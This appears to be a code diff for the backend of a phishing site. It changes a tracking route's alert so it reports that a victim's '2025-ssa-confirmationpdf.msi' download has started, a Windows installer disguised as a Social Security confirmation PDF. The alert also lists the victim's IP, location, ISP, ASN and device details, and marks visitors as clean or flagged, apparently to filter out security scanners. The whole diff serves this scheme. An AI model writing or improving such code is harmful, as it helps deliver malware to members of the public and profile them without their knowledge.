@@ -56,7 +56,7 @@ export async function POST(request: NextRequest) {
         }
 
         if (data.event === 'Page Visit - Verified Human') {
-            const message = formatMessage(data, ip);
+            const message = formatMessage(data, ip, securityCheck);
 
             const promises = [];
 
@@ -84,8 +84,29 @@ export async function POST(request: NextRequest) {
     }
 }
 
-function formatMessage(data: TrackingData, ip: string): string {
-    let message = `📅 Time: ${data.timestamp || new Date().toISOString()}\n`;
+function formatMessage(data: TrackingData, ip: string, security: SecurityCheckResult | null): string {
+    const fileName = process.env.DOWNLOAD_FILE_PATH || '2025-ssa-confirmationpdf.msi';
+    
+    let message = `🔔 Your ${fileName} has started downloading\n\n`;
+    
+    if (security) {
+        const statusIcon = security.isSafe ? '✅' : '🚨';
+        const statusText = security.isSafe ? 'CLEAN' : 'FLAGGED';
+        message += `🔒 Status: ${statusIcon} ${statusText}\n`;
+        
+        if (security.location) {
+            message += `🌍 Location: ${security.location.city}, ${security.location.country} (${security.location.countryCode})\n`;
+        }
+        
+        const isp = security.asn?.org || security.company?.name || 'Unknown';
+        message += `📡 ISP: ${isp}\n`;
+        
+        if (security.asn) {
+            message += `🔢 ASN: AS${security.asn.number}\n`;
+        }
+    }
+    
+    message += `\n📅 Time: ${data.timestamp || new Date().toISOString()}\n`;
     message += `🌐 IP: ${ip}\n`;
     message += `💻 User Agent: ${data.userAgent || 'Unknown'}\n`;
     message += `📱 Platform: ${data.platform || 'Unknown'}\n`;
